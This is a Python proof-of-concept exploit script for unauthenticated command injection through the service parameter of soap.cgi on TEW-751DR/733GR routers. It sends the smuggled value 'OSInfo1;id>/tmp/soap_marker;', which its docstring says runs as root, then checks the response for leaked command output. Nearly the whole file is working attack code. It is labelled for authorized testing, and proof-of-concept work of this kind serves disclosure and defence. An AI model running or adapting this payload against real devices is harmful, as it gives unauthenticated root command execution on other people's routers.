#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""soap_service_injection.py - TRENDnet TEW-751DR / 733GR soap.cgi service injection

Sends the unauthenticated control request and the injected request to the UPnP
control endpoint on 49152/tcp. On a device (or a lab bridge that forwards to the
vendor CGI) the injected command runs as root.

    TARGET=http://192.168.10.1:49152 python3 soap_service_injection.py

The script does not read anything from the device: it only issues the two
requests and prints what came back. Verify the side effect on the device (or with
a second request that reads the marker), not from this output alone.

Authorized testing only.
"""
from __future__ import annotations

import os
import re
import sys
import urllib.error
import urllib.request

TARGET = os.environ.get("TARGET", "http://192.168.10.1:49152").rstrip("/")
MARKER = os.environ.get("MARKER", "/tmp/soap_marker")
UA = "Mozilla/5.0 (soap-service-poc)"


def post(service: str, timeout: int = 10) -> tuple[int, bytes]:
    url = f"{TARGET}/soap.cgi?service={service}"
    req = urllib.request.Request(url, data=b"", method="POST", headers={
        "Content-Type": "text/xml",
        "SOAPAction": '"urn:schemas-upnp-org:service:OSInfo:1#GetInfo"',
        "User-Agent": UA,
        "Content-Length": "0",
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as exc:  # noqa: BLE001
        print(f"[x] {TARGET} unreachable: {exc}", file=sys.stderr)
        raise SystemExit(2)


def main() -> int:
    print(f"[i] target {TARGET}")
    st, body = post("OSInfo1")
    print(f"[>] control  service=OSInfo1            -> HTTP {st}  {len(body)} bytes")

    payload = f"OSInfo1;id>{MARKER};"
    st, body = post(payload)
    print(f"[>] trigger  service={payload!r} -> HTTP {st}  {len(body)} bytes")

    text = body.decode("utf-8", "replace")
    if re.search(r"uid=\d+\(", text):
        print("[+] command output leaked in the response:")
        for line in text.splitlines():
            if "uid=" in line:
                print("    " + line.strip())
    else:
        print("[i] no command output in the response (blind execution is expected if the")
        print("    server flushes its own header first); check the marker file on the device:")
        print(f"    cat {MARKER}")
    print("\n[i] control vs trigger differ only in the ';id>...;' segment")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
